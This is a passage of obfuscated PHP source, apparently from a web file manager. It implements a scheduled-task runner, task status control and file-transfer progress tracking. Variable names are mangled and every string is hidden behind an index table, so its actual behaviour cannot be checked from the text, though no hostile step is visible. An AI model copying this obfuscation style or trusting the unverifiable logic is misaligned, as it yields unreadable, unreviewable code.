Model($Ò•ÎÀ½’[1635])->listData(); $ÒŞ¿şüÈ = count($‰È”ô¥); for ($ê”¸ãÇ© = 0; $ê”¸ãÇ© < $ÒŞ¿şüÈ; $ê”¸ãÇ©++) { $µñ§êæÆ = $‰È”ô¥[$ê”¸ãÇ©]; if (!$µñ§êæÆ[$Ò•ÎÀ½’[452]] || $µñ§êæÆ[$Ò•ÎÀ½’[1636]] != $Ò•ÎÀ½’[88]) { continue; } if (!self::taskTimeCheck($µñ§êæÆ)) { continue; } self::taskRun($µñ§êæÆ); } Hook::trigger($Ò•ÎÀ½’[1637]); self::taskQueueRun($îêÆ•Â™); } private static function taskQueueRun($¡şª²æ“) { $ƒıªĞÑÈ = 10; while (!0) { $ï‰ú…úˆ = TaskQueue::run(); if ($ï‰ú…úˆ === !1) { break; } if (timeFloat() - $¡şª²æ“ >= $ƒıªĞÑÈ) { break; } } } private static function taskTimeCheck($÷Š´öÌ) { $÷÷Å® =& $_SERVER[–Ú¬çÁ]; $ıôø‡ˆŠ = json_decode($÷Š´öÌ[$÷÷Å®[194]], !0); $ıÕ‹˜¶Â = intval($÷Š´öÌ[$÷÷Å®[1623]]); $˜¤¸àÔÉ = strtotime($÷÷Å®[1638] . $ıôø‡ˆŠ[$÷÷Å®[1639]] . $÷÷Å®[1640]) - strtotime($÷÷Å®[1641]); $åÓùÓ¯± = time() - strtotime(date($÷÷Å®[1642]) . $÷÷Å®[1643]); $ñáß±«ç = $åÓùÓ¯± >= $˜¤¸àÔÉ && $åÓùÓ¯± <= $˜¤¸àÔÉ + 3600; switch ($ıôø‡ˆŠ[$÷÷Å®[33]]) { case $÷÷Å®[1644]: if (time() - $ıÕ‹˜¶Â < 3600 * 24 * 30) { return !1; } if ($ıôø‡ˆŠ[$÷÷Å®[1644]] == date($÷÷Å®[1645]) && $ñáß±«ç) { return !0; } break; case $÷÷Å®[1646]: if (time() - $ıÕ‹˜¶Â < 3600 * 24 * 7) { return !1; } $ÔÚ×Ùî¯ = date($÷÷Å®[1647]) == 0 ? 7 : date($÷÷Å®[1647]); if ($ıôø‡ˆŠ[$÷÷Å®[1646]] == $ÔÚ×Ùî¯ && $ñáß±«ç) { return !0; } break; case $÷÷Å®[1639]: if (time() - $ıÕ‹˜¶Â < 3600 * 24) { return !1; } if ($ñáß±«ç) { return !0; } break; case $÷÷Å®[1648]: if (time() - $ıÕ‹˜¶Â >= floatval($ıôø‡ˆŠ[$÷÷Å®[1648]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¢ºÒà£‹ =& $_SERVER[–Ú¬çÁ]; static $õ‘¬ªşæ = 0; $í±Åì = 300; if (!$õ‘¬ªşæ) { $õ‘¬ªşæ = time(); } if (time() - $õ‘¬ªşæ < $í±Åì) { return; } $õ‘¬ªşæ = time(); $Æñ‰ñç„ = Model($¢ºÒà£‹[556])->db($¢ºÒà£‹[12]); if ($Æñ‰ñç„) { $Æñ‰ñç„->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¢ºÒà£‹[1649], $¢ºÒà£‹[1650]); die; } } public static function taskRun($›ßı÷ñ„) { $÷øô©ùì =& $_SERVER[–Ú¬çÁ]; self::log($÷øô©ùì[1651] . $›ßı÷ñ„[$÷øô©ùì[452]] . $÷øô©ùì[1652] . $›ßı÷ñ„[$÷øô©ùì[32]] . $÷øô©ùì[1653] . $›ßı÷ñ„[$÷øô©ùì[1654]]); Model($÷øô©ùì[1635])->run($›ßı÷ñ„[$÷øô©ùì[452]]); $êÓ—°ö³ = timeFloat(); $ÉÕ°å• = $÷øô©ùì[12]; switch ($›ßı÷ñ„[$÷øô©ùì[33]]) { case $÷øô©ùì[360]: $ÇÏí‰…Õ = url_request($›ßı÷ñ„[$÷øô©ùì[1654]], $÷øô©ùì[255], !1, !1, !1, !1, 10); if ($ÇÏí‰…Õ[$÷øô©ùì[770]]) { $ÉÕ°å• = strlen($ÇÏí‰…Õ[$÷øô©ùì[1222]]); } break; case $÷øô©ùì[254]: $ÉÕ°å• = Hook::apply($›ßı÷ñ„[$÷øô©ùì[1654]]); default: break; } Model($÷øô©ùì[1655])->add(array($÷øô©ùì[1656] => $÷øô©ùì[12], $÷øô©ùì[1657] => $÷øô©ùì[222], $÷øô©ùì[33] => $÷øô©ùì[1658] . $›ßı÷ñ„[$÷øô©ùì[452]], $÷øô©ùì[1659] => json_encode(array($÷øô©ùì[32] => $›ßı÷ñ„[$÷øô©ùì[32]], $÷øô©ùì[1660] => timeFloat() - $êÓ—°ö³, $÷øô©ùì[346] => $ÉÕ°å•)))); $Œãûí€Ú = $ÉÕ°å• ? $÷øô©ùì[1661] . $ÉÕ°å• : $÷øô©ùì[12]; self::log($÷øô©ùì[1662] . $›ßı÷ñ„[$÷øô©ùì[452]] . $÷øô©ùì[165] . $Œãûí€Ú); return !0; } public static function valueGet($Ã¹ Áàñ) { $ÑËÒ¥©’ =& $_SERVER[–Ú¬çÁ]; $ï†»şõ² = $ÑËÒ¥©’[1663]; $’ä¶ªÔ÷ = Model($ÑËÒ¥©’[485])->get($Ã¹ Áàñ, $ï†»şõ²); if (is_null($’ä¶ªÔ÷)) { Model($ÑËÒ¥©’[485])->set($ÑËÒ¥©’[770], $ÑËÒ¥©’[88], $ï†»şõ²); Model($ÑËÒ¥©’[485])->set($ÑËÒ¥©’[1622], $ÑËÒ¥©’[222], $ï†»şõ²); $’ä¶ªÔ÷ = Model($ÑËÒ¥©’[485])->get($Ã¹ Áàñ, $ï†»şõ²); } return $’ä¶ªÔ÷; } private static function valueSet($ÃïĞÛÉ«, $ØÊ°„) { $÷÷ÊÓ¸“ =& $_SERVER[–Ú¬çÁ]; $û¤ˆ¢ËÁ = $÷÷ÊÓ¸“[1664]; CacheLock::lock($û¤ˆ¢ËÁ); $ôöûÀ¸ = Model($÷÷ÊÓ¸“[485])->set($ÃïĞÛÉ«, $ØÊ°„, $÷÷ÊÓ¸“[1663]); CacheLock::unlock($û¤ˆ¢ËÁ); return $ôöûÀ¸; } protected static function log($´ ï³‚Ö) { write_log($´ ï³‚Ö, $_SERVER[–Ú¬çÁ][1650]); } private static function cacheClear() { $Ïçô–Ô =& $_SERVER[–Ú¬çÁ]; Cache::clearMemory(Model($Ïçô–Ô[485])->cacheKey($Ïçô–Ô[1663])); Cache::clearMemory(Model($Ïçô–Ô[485])->cacheKey($Ïçô–Ô[1665])); Model($Ïçô–Ô[1635])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\162\x75\x6e\156\151\x6e\x67"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($°Ìİ¬¶Ù, $Á™ŸÔæÊ = '', $ã”±úø = 0, $Ú¹¬Àåß = '') { $ŞŞôìÍ =& $_SERVER[–Ú¬çÁ]; if (self::get($°Ìİ¬¶Ù)) { return; } $this->task = array($ŞŞôìÍ[452] => $°Ìİ¬¶Ù, $ŞŞôìÍ[1666] => USER_ID, $ŞŞôìÍ[1561] => $Ú¹¬Àåß, $ŞŞôìÍ[503] => $ŞŞôìÍ[12], $ŞŞôìÍ[33] => $Á™ŸÔæÊ, $ŞŞôìÍ[1084] => $ŞŞôìÍ[12], $ŞŞôìÍ[806] => $ã”±úø, $ŞŞôìÍ[1667] => 0, $ŞŞôìÍ[1668] => 0, $ŞŞôìÍ[1669] => 0, $ŞŞôìÍ[1670] => timeFloat(), $ŞŞôìÍ[1671] => 0, $ŞŞôìÍ[1672] => 0, $ŞŞôìÍ[1673] => 0, $ŞŞôìÍ[1674] => 0, $ŞŞôìÍ[770] => $ŞŞôìÍ[1622]); $GLOBALS[$ŞŞôìÍ[1675]] = 1; Hook::bind($ŞŞôìÍ[1626], array($this, $ŞŞôìÍ[1676])); Hook::bind($ŞŞôìÍ[1677], array($this, $ŞŞôìÍ[1678])); $this->startAfter(); Hook::trigger($ŞŞôìÍ[1679], $this->task); $this->task[$ŞŞôìÍ[1672]] = timeFloat(); } public function end($ŒËÜÇ‚î = '') { $ÃÎœÛö =& $_SERVER[–Ú¬çÁ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ÃÎœÛö[1672]]) { self::valueSet($this->task[$ÃÎœÛö[452]], !1); } $this->isEnd = !0; if ($ŒËÜÇ‚î) { $this->task[$ÃÎœÛö[503]] = $ŒËÜÇ‚î; } self::log($ÃÎœÛö[1680] . $this->task[$ÃÎœÛö[452]] . $ÃÎœÛö[1681] . sprintf($ÃÎœÛö[871], timeFloat() - $this->task[$ÃÎœÛö[1670]]) . $ÃÎœÛö[1682]); Hook::unbind($ÃÎœÛö[1626], array($this, $ÃÎœÛö[1676])); Hook::unbind($ÃÎœÛö[1677], array($this, $ÃÎœÛö[1678])); $this->endAfter(); $Õ†ëĞ±á = $this->task; $this->task = !1; Hook::trigger($ÃÎœÛö[1683], $Õ†ëĞ±á); } public function update($Íòñâ¶õ = 0, $°‹Œó° = false) { $§³ºñ±Ç =& $_SERVER[–Ú¬çÁ]; $„‡§Ó­± =& $this->task; if (!$„‡§Ó­±) { return; } $„‡§Ó­±[$§³ºñ±Ç[1667]] += $Íòñâ¶õ; $„‡§Ó­±[$§³ºñ±Ç[1671]] = timeFloat(); if ($„‡§Ó­±[$§³ºñ±Ç[806]]) { if ($„‡§Ó­±[$§³ºñ±Ç[806]] < $„‡§Ó­±[$§³ºñ±Ç[1667]]) { $„‡§Ó­±[$§³ºñ±Ç[806]] = $„‡§Ó­±[$§³ºñ±Ç[1667]]; } $óş¶ûı¢ = timeFloat() - $„‡§Ó­±[$§³ºñ±Ç[1670]] - $„‡§Ó­±[$§³ºñ±Ç[1673]]; if ($óş¶ûı¢ <= 0) { $óş¶ûı¢ = 0.001; } $„‡§Ó­±[$§³ºñ±Ç[1668]] = $„‡§Ó­±[$§³ºñ±Ç[1667]] / $„‡§Ó­±[$§³ºñ±Ç[806]]; $„‡§Ó­±[$§³ºñ±Ç[1669]] = $„‡§Ó­±[$§³ºñ±Ç[1667]] / $óş¶ûı¢; if ($„‡§Ó­±[$§³ºñ±Ç[1668]] > 0) { $„‡§Ó­±[$§³ºñ±Ç[1674]] = $óş¶ûı¢ * (1 - $„‡§Ó­±[$§³ºñ±Ç[1668]]) / $„‡§Ó­±[$§³ºñ±Ç[1668]]; } $„‡§Ó­±[$§³ºñ±Ç[1674]] = $„‡§Ó­±[$§³ºñ±Ç[1674]] <= 0 ? 0 : $„‡§Ó­±[$§³ºñ±Ç[1674]]; } $this->updateAfter(); $¥¥¢ı¶Ğ = 0.2; if (timeFloat() - $„‡§Ó­±[$§³ºñ±Ç[1672]] < $¥¥¢ı¶Ğ && !$°‹Œó°) { return; } $”úşêç = self::get($„‡§Ó­±[$§³ºñ±Ç[452]]); $…ñˆÄŒí = $”úşêç[$§³ºñ±Ç[770]]; if ($…ñˆÄŒí == self::STATYS_KILL) { $€êüğÔ = array($§³ºñ±Ç[1684] => LNG($§³ºñ±Ç[1685]), $§³ºñ±Ç[1232] => !1); Cache::set($§³ºñ±Ç[1686] . $this->task[$§³ºñ±Ç[452]], $€êüğÔ, 30); $this->onKill(); $this->end(); die; } else { if ($…ñˆÄŒí == self::STATYS_STOP) { $¢÷¹¥üã = 2; $”úşêç[$§³ºñ±Ç[1673]] += $¢÷¹¥üã; self::valueSet($„‡§Ó­±[$§³ºñ±Ç[452]], $”úşêç); sleep($¢÷¹¥üã); $this->update(); return; } } $„‡§Ó­±[$§³ºñ±Ç[770]] = $…ñˆÄŒí ? $…ñˆÄŒí : $„‡§Ó­±[$§³ºñ±Ç[770]]; $„‡§Ó­±[$§³ºñ±Ç[1673]] = $”úşêç[$§³ºñ±Ç[1673]] ? $”úşêç[$§³ºñ±Ç[1673]] : 0; $„‡§Ó­±[$§³ºñ±Ç[1672]] = timeFloat(); Hook::trigger($§³ºñ±Ç[1687], $„‡§Ó­±); self::valueSet($„‡§Ó­±[$§³ºñ±Ç[452]], $„‡§Ó­±); } public function onKillSet($‘Ûéƒñœ, $ø‹Ş©€¿ = array()) { $this->onKillCall = array($‘Ûéƒñœ, $ø‹Ş©€¿); } public function onKill() { $Âôıä =& $_SERVER[–Ú¬çÁ]; self::log($Âôıä[1680] . $this->task[$Âôıä[452]] . $Âôıä[1688]); Hook::trigger($Âôıä[1689], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ŒÓ¦¾µı) { $ÎìÔû•› =& $_SERVER[–Ú¬çÁ]; Cache::set($ÎìÔû•›[1686] . $this->task[$ÎìÔû•›[452]], $ŒÓ¦¾µı, 60); return $ŒÓ¦¾µı; } public static function get($—ïä¥Â’) { $§ÕÊ‡ò =& $_SERVER[–Ú¬çÁ]; $²‘ö˜¢Õ = self::valueGet($—ïä¥Â’); if (is_array($²‘ö˜¢Õ) && $²‘ö˜¢Õ[$§ÕÊ‡ò[1690]]) { $€‘÷é‚ê = ActionApply($²‘ö˜¢Õ[$§ÕÊ‡ò[1690]], array($²‘ö˜¢Õ)); $²‘ö˜¢Õ = is_array($€‘÷é‚ê) ? $€‘÷é‚ê : $²‘ö˜¢Õ; } return $²‘ö˜¢Õ; } public static function listData() { $ùîÂíë¥ = self::valueGet(); return array_sort_by($ùîÂíë¥, $_SERVER[–Ú¬çÁ][1670], !0); } public static function kill($ÊöóÇòµ) { return self::changeStatus($ÊöóÇòµ, self::STATYS_KILL); } public static function stop($¬´˜±Ø‘) { return self::changeStatus($¬´˜±Ø‘, self::STATYS_STOP); } public static function restart($Œãõ†ï) { return self::changeStatus($Œãõ†ï, self::STATYS_RUNNING); } public static function killAll() { $û½½øÕú =& $_SERVER[–Ú¬çÁ]; $Ôõ«’üİ = self::listData(); foreach ($Ôõ«’üİ as $æ¼‰Ã) { self::kill($æ¼‰Ã[$û½½øÕú[452]]); } sleep(2); foreach ($Ôõ«’üİ as $æ¼‰Ã) { self::valueSet($æ¼‰Ã[$û½½øÕú[452]], !1); } } private static function changeStatus($¯ ×šª„, $±”Ú“÷Ä) { $¢òØ÷¬ì =& $_SERVER[–Ú¬çÁ]; $òÕÑÕ— = self::valueGet($¯ ×šª„); if (!$òÕÑÕ—) { return !1; } $òÕÑÕ—[$¢òØ÷¬ì[770]] = $±”Ú“÷Ä; self::valueSet($¯ ×šª„, $òÕÑÕ—); self::log($¢òØ÷¬ì[1691] . $òÕÑÕ—[$¢òØ÷¬ì[452]] . $¢òØ÷¬ì[1692] . $±”Ú“÷Ä); return !0; } public static function valueGet($”å¶Æ¿ = false) { $Áš×Ÿ =& $_SERVER[–Ú¬çÁ]; if ($”å¶Æ¿) { $éâÏËÒ× = Model($Áš×Ÿ[497])->where(array($Áš×Ÿ[94] => $”å¶Æ¿, $Áš×Ÿ[33] => $Áš×Ÿ[1091]))->find(); return $éâÏËÒ× ? json_decode($éâÏËÒ×[$Áš×Ÿ[427]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($¦£‡†İ = false) { $«¯§«² =& $_SERVER[–Ú¬çÁ]; $Å¨ìÁ¾ = array($«¯§«²[33] => $«¯§«²[1091]); if ($¦£‡†İ) { $Å¨ìÁ¾[$«¯§«²[1666]] = $¦£‡†İ; } $ÒììÏì· = Model($«¯§«²[497])->where($Å¨ìÁ¾)->select(); $ÒììÏì· = $ÒììÏì· ? $ÒììÏì· : array(); foreach ($ÒììÏì· as $œšåÙ» => $˜­†‚Œ“) { $ÒììÏì·[$œšåÙ»] = json_decode($˜­†‚Œ“[$«¯§«²[427]], !0); } return $ÒììÏì·; } public static function valueSet($ÀñÊÆ¢, $„ŸíÃ€Ş) { $´ª÷Â«š =& $_SERVER[–Ú¬çÁ]; if (!$„ŸíÃ€Ş) { return Model($´ª÷Â«š[497])->where(array($´ª÷Â«š[94] => $ÀñÊÆ¢, $´ª÷Â«š[33] => $´ª÷Â«š[1091]))->delete(); } $£¦òğåØ = json_encode($„ŸíÃ€Ş); if (!$£¦òğåØ) { ob_start(); var_dump($„ŸíÃ€Ş); $“™°ëî± = ob_get_clean(); self::log($´ª÷Â«š[1693] . json_encode_force($“™°ëî±)); } if (!$ÀñÊÆ¢ || !$„ŸíÃ€Ş[$´ª÷Â«š[452]]) { return !1; } $ğîÔ£ñ§ = array($´ª÷Â«š[33] => $´ª÷Â«š[1091], $´ª÷Â«š[1666] => USER_ID, $´ª÷Â«š[94] => $ÀñÊÆ¢, $´ª÷Â«š[427] => $£¦òğåØ); $œÓï²­ = $´ª÷Â«š[1694]; CacheLock::lock($œÓï²­); Model($´ª÷Â«š[497])->add($ğîÔ£ñ§, array(), !0); CacheLock::unlock($œÓï²­); } public static function log($Ñ•Îğ¬à) { if (!GLOBAL_DEBUG) { return; } write_log($Ñ•Îğ¬à, $_SERVER[–Ú¬çÁ][1695]); } } class TaskFileTransfer extends Task { protected function startAfter() { $âğâğÓ =& $_SERVER[–Ú¬çÁ]; $£ù¡ß»¡ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($âğâğÓ[1696], array($this, $âğâğÓ[1697])); Hook::bind($âğâğÓ[1243], array($this, $âğâğÓ[1698])); Hook::bind($âğâğÓ[1699], array($this, $âğâğÓ[1700])); Hook::bind($âğâğÓ[646], array($this, $âğâğÓ[1701])); Hook::bind($âğâğÓ[647], array($this, $âğâğÓ[1702])); Hook::bind($âğâğÓ[653], array($this, $âğâğÓ[1703])); Hook::bind($âğâğÓ[654], array($this, $âğâğÓ[1704])); Hook::bind($âğâğÓ[649], array($this, $âğâğÓ[1705])); Hook::bind($âğâğÓ[651], array($this, $âğâğÓ[1706])); Hook::bind($âğâğÓ[615], array($this, $âğâğÓ[1707])); Hook::bind($âğâğÓ[612], array($this, $âğâğÓ[1707])); Hook::bind($âğâğÓ[617], array($this, $âğâğÓ[1707])); Hook::bind($âğâğÓ[619], array($this, $âğâğÓ[1707])); Hook::bind($âğâğÓ[621], array($this, $âğâğÓ[1707])); Hook::bind($âğâğÓ[1708], array($this, $âğâğÓ[1709])); Hook::bind($âğâğÓ[637], array($this, $âğâğÓ[1710])); $this->sourceModelCopyFlag = !1; Hook::bind($âğâğÓ[1711], array($this, $âğâğÓ[1712])); Hook::bind($âğâğÓ[1713], array($this, $âğâğÓ[1714])); Hook::bind($âğâğÓ[1715], array($this, $âğâğÓ[1716])); $£ù¡ß»¡[$âğâğÓ[1717]] = LNG($âğâğÓ[1718]); $£ù¡ß»¡[$âğâğÓ[1719]] = 0; $£ù¡ß»¡[$âğâğÓ[1720]] = 0; $£ù¡ß»¡[$âğâğÓ[1084]] = $âğâğÓ[12]; $£ù¡ß»¡[$âğâğÓ[1721]] = $âğâğÓ[12]; $£ù¡ß»¡[$âğâğÓ[1722]] = 0; $£ù¡ß»¡[$âğâğÓ[1723]] = 0; $£ù¡ß»¡[$âğâğÓ[1724]] = 0; if (!$£ù¡ß»¡[$âğâğÓ[1561]]) { $£ù¡ß»¡[$âğâğÓ[1561]] = LNG($âğâğÓ[1725]); } } protected function endAfter() { $ä’¿ø€ş =& $_SERVER[–Ú¬çÁ]; Hook::unbind($ä’¿ø€ş[1696], array($this, $ä’¿ø€ş[1697])); Hook::unbind($ä’¿ø€ş[1243], array($this, $ä’¿ø€ş[1698])); Hook::unbind($ä’¿ø€ş[1699], array($this, $ä’¿ø€ş[1700])); Hook::unbind($ä’¿ø€ş[646], array($this, $ä’¿ø€ş[1701])); Hook::unbind($ä’¿ø€ş[647], array($this, $ä’¿ø€ş[1702])); Hook::unbind($ä’¿ø€ş[653], array($this, $ä’¿ø€ş[1703])); Hook::unbind($ä’¿ø€ş[654], array($this, $ä’¿ø€ş[1704])); Hook::unbind($ä’¿ø€ş[649], array($this, $ä’¿ø€ş[1705])); Hook::unbind($ä’¿ø€ş[651], array($this, $ä’¿ø€ş[1706])); Hook::unbind($ä’¿ø€ş[615], array($this, $ä’¿ø€ş[1707])); Hook::unbind($ä’¿ø€ş[612], array($this, $ä’¿ø€ş[1707])); Hook::unbind($ä’¿ø€ş[617], array($this, $ä’¿ø€ş[1707])); Hook::unbind($ä’¿ø€ş[619], array($this, $ä’¿ø€ş[1707])); Hook::unbind($ä’¿ø€ş[621], array($this, $ä’¿ø€ş[1707])); Hook::unbind($ä’¿ø€ş[1708], array($this, $ä’¿ø€ş[1709])); Hook::unbind($ä’¿ø€ş[637], array($this, $ä’¿ø€ş[1710])); Hook::unbind($ä’¿ø€ş[1711], array($this, $ä’¿ø€ş[1712])); Hook::unbind($ä’¿ø€ş[1713], array($this, $ä’¿ø€ş[1714])); Hook::unbind($ä’¿ø€ş[1715], array($this, $ä’¿ø€ş[1716])); } public function copyMoveStart($ßŞİéÕÉ, $è¦“ä×ñ, $Î»……°€, $ŒÉŠğü) { $÷›ğ´¢„ =& $_SERVER[–Ú¬çÁ]; self::log($÷›ğ´¢„[1726] . $è¦“ä×ñ . $÷›ğ´¢„[70] . $ŒÉŠğü); $îÔÇ†½° = rtrim(TEMP_FILES, $÷›ğ´¢„[8]); if (substr($è¦“ä×ñ, 0, strlen($îÔÇ†½°)) == $îÔÇ†½°) { return; } if (substr($ŒÉŠğü, 0, strlen($îÔÇ†½°)) == $îÔÇ†½°) { return; } $Íğ¡ÈÒä =& $this->task; $Íğ¡ÈÒä[$÷›ğ´¢„[1727]] = KodIO::transferType($ßŞİéÕÉ, $Î»……°€); $this->update(); } public function updateAfter() { $¤“ƒµ°ª =& $_SERVER[–Ú¬çÁ]; $œü…ßµ¬ =& $this->task; if (!$œü…ßµ¬[$¤“ƒµ°ª[783]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($œü…ßµ¬[$¤“ƒµ°ª[1727]] == $¤“ƒµ°ª[1335]) { return; } self::updateTask($œü…ßµ¬); } private static function updateTask(&$àíŠş¹) { $€üÛ×• =& $_SERVER[–Ú¬çÁ]; if ($àíŠş¹[$€üÛ×•[1727]] == $€üÛ×•[1214] || $àíŠş¹[$€üÛ×•[1727]] == $€üÛ×•[107]) { if ($àíŠş¹[$€üÛ×•[1721]]) { $àíŠş¹[$€üÛ×•[1724]] = $àíŠş¹[$€üÛ×•[1723]] + $àíŠş¹[$€üÛ×•[1720]]; } } else { if ($àíŠş¹[$€üÛ×•[1727]] == $€üÛ×•[1336]) { if ($àíŠş¹[$€üÛ×•[1721]] == $€üÛ×•[1214]) { $àíŠş¹[$€üÛ×•[1724]] = $àíŠş¹[$€üÛ×•[1723]] + $àíŠş¹[$€üÛ×•[1720]] * 0.5; } else { if ($àíŠş¹[$€üÛ×•[1721]] == $€üÛ×•[107]) { $àíŠş¹[$€üÛ×•[1724]] = $àíŠş¹[$€üÛ×•[1723]] + $àíŠş¹[$€üÛ×•[1719]] * 0.5 + $àíŠş¹[$€üÛ×•[1720]] * 0.5; } } } } $àíŠş¹[$€üÛ×•[1668]] = $àíŠş¹[$€üÛ×•[1724]] / $àíŠş¹[$€üÛ×•[783]]; if ($àíŠş¹[$€üÛ×•[1668]] > 0) { $İËôŸ“ø = timeFloat() - $àíŠş¹[$€üÛ×•[1670]] - $àíŠş¹[$€üÛ×•[1673]]; $àíŠş¹[$€üÛ×•[1674]] = $İËôŸ“ø * (1 - $àíŠş¹[$€üÛ×•[1668]]) / $àíŠş¹[$€üÛ×•[1668]]; } } public function addPath($±¾¨ÁÊâ) { $ú†×ãÓÖ =& $_SERVER[–Ú¬çÁ]; if (!$±¾¨ÁÊâ) { return; } $×óè‰‚ =& $this->task; $¨¦©‚ĞÚ = IO::infoWithChildren($±¾¨ÁÊâ); $ ‡è¦¿ = $×óè‰‚[$ú†×ãÓÖ[1728]] ? $×óè‰‚[$ú†×ãÓÖ[1728]][$ú†×ãÓÖ[1729]] : 0; $×óè‰‚[$ú†×ãÓÖ[1728]] = array($ú†×ãÓÖ[1729] => $ ‡è¦¿ + 1, $ú†×ãÓÖ[471] => $¨¦©‚ĞÚ[$ú†×ãÓÖ[32]], $ú†×ãÓÖ[84] => $¨¦©‚ĞÚ[$ú†×ãÓÖ[84]], $ú†×ãÓÖ[561] => $¨¦©‚ĞÚ[$ú†×ãÓÖ[561]] ? $¨¦©‚ĞÚ[$ú†×ãÓÖ[561]] : $¨¦©‚ĞÚ[$ú†×ãÓÖ[84]]); if ($¨¦©‚ĞÚ[$ú†×ãÓÖ[33]] == $ú†×ãÓÖ[224]) { $×óè‰‚[$ú†×ãÓÖ[806]] += 1; } else { $×óè‰‚[$ú†×ãÓÖ[806]] += $¨¦©‚ĞÚ[$ú†×ãÓÖ[79]][$ú†×ãÓÖ[77]]; if ($¨¦©‚ĞÚ[$ú†×ãÓÖ[181]]) { $×óè‰‚[$ú†×ãÓÖ[806]] += $¨¦©‚ĞÚ[$ú†×ãÓÖ[79]][$ú†×ãÓÖ[78]] + 1; } } $×óè‰‚[$ú†×ãÓÖ[783]] += $¨¦©‚ĞÚ[$ú†×ãÓÖ[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÔÆ¥ûûú) { } public function sourceAddHashEnd($¦ı‡±ş¬) { } public function sourceAddFileStart($¹²­è–º) { $¡õĞŒ£» =& $_SERVER[–Ú¬çÁ]; $„â•ßËœ =& $this->task; $„â•ßËœ[$¡õĞŒ£»[1719]] = $¹²­è–º[$¡õĞŒ£»[76]]; $„â•ßËœ[$¡õĞŒ£»[1717]] = $¹²­è–º[$¡õĞŒ£»[32]]; $„â•ßËœ[$¡õĞŒ£»[1084]] = $¹²­è–º[$¡õĞŒ£»[32]]; $„â•ßËœ[$¡õĞŒ£»[1730]] = $¹²­è–º[$¡õĞŒ£»[84]]; $this->update(); } public function sourceAddFileEnd($¯ÊÖ…·) { $¥¦×¦– =& $_SERVER[–Ú¬çÁ]; $ÔôÚı›ß =& $this->task; $ÔôÚı›ß[$¥¦×¦–[1724]] += $¯ÊÖ…·[$¥¦×¦–[76]]; $ÔôÚı›ß[$¥¦×¦–[1730]] = $¯ÊÖ…·[$¥¦×¦–[84]]; $this->update(1); } public function copyFileStart($ß–ç—±î, $ë¤ï—¬‹, $İæ›¯¾Ş, $€³Ãùá¹, $·—¨î…¢, $‡¢Œ¢°Á) { $«èğ¿ŠÈ =& $_SERVER[–Ú¬çÁ]; $©”ŞÖåŞ = $·—¨î…¢; if ($©”ŞÖåŞ == $GLOBALS[$«èğ¿ŠÈ[1731]]) { $©”ŞÖåŞ = $GLOBALS[$«èğ¿ŠÈ[1732]]; } $GLOBALS[$«èğ¿ŠÈ[1732]] = $·—¨î…¢; $GLOBALS[$«èğ¿ŠÈ[1731]] = $‡¢Œ¢°Á; $Ğ…‘¬‡û =& $this->task; $Ğ…‘¬‡û[$«èğ¿ŠÈ[1717]] = $©”ŞÖåŞ; $Ğ…‘¬‡û[$«èğ¿ŠÈ[1719]] = (int) $ß–ç—±î->size($ë¤ï—¬‹); $Ğ…‘¬‡û[$«èğ¿ŠÈ[1720]] = 0; $Ğ…‘¬‡û[$«èğ¿ŠÈ[1084]] = $«èğ¿ŠÈ[12]; $Ğ…‘¬‡û[$«èğ¿ŠÈ[1721]] = $«èğ¿ŠÈ[12]; $Ğ…‘¬‡û[$«èğ¿ŠÈ[1722]] = 0; $»Æ«½ì = $Ğ…‘¬‡û[$«èğ¿ŠÈ[1719]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Ğ…‘¬‡û[$«èğ¿ŠÈ[452]] . $«èğ¿ŠÈ[1733]); if ($»Æ«½ì && file_exists(get_path_father($€³Ãùá¹))) { Cache::set($Ğ…‘¬‡û[$«èğ¿ŠÈ[452]] . $«èğ¿ŠÈ[1733], $€³Ãùá¹); $Ğ…‘¬‡û[$«èğ¿ŠÈ[1690]] = array($«èğ¿ŠÈ[1734], $«èğ¿ŠÈ[1735]); } $this->update(0, $»Æ«½ì); } public static function updateCopyLocalFileSize($ı˜úì¶ü) { $À¨™ËÎØ =& $_SERVER[–Ú¬çÁ]; $Ñ¥¶ôõ = Cache::get($ı˜úì¶ü[$À¨™ËÎØ[452]] . $À¨™ËÎØ[1733]); if (!$Ñ¥¶ôõ || !file_exists($Ñ¥¶ôõ)) { return $ı˜úì¶ü; } $ı˜úì¶ü[$À¨™ËÎØ[1720]] = @filesize($Ñ¥¶ôõ); $ı˜úì¶ü[$À¨™ËÎØ[1724]] += $ı˜úì¶ü[$À¨™ËÎØ[1720]]; self::updateTask($ı˜úì¶ü); return $ı˜úì¶ü; } public function copyFileEnd($‹ë„óµ¹, $³†æ¬µ, $·‹ãµ’Ë, $œÒà´Ñ, $È¦ª´âî, $ëĞ£´¤) { $€™ÓıÂê =& $_SERVER[–Ú¬çÁ]; $ üŒ­ß¤ =& $this->task; $ üŒ­ß¤[$€™ÓıÂê[1720]] = $ üŒ­ß¤[$€™ÓıÂê[1719]]; $ üŒ­ß¤[$€™ÓıÂê[1721]] = $€™ÓıÂê[12]; unset($ üŒ­ß¤[$€™ÓıÂê[1690]]); if ($È¦ª´âî == $ üŒ­ß¤[$€™ÓıÂê[1717]]) { $ üŒ­ß¤[$€™ÓıÂê[1723]] += $ üŒ­ß¤[$€™ÓıÂê[1719]]; $ üŒ­ß¤[$€™ÓıÂê[1724]] = $ üŒ­ß¤[$€™ÓıÂê[1723]]; $ûò¬Ò»£ = 1; if (isset($ üŒ­ß¤[$€™ÓıÂê[1730]]) && $ üŒ­ß¤[$€™ÓıÂê[1730]] == $³†æ¬µ) { $ûò¬Ò»£ = 0; } $this->update($ûò¬Ò»£); } else { $this->update(); $ 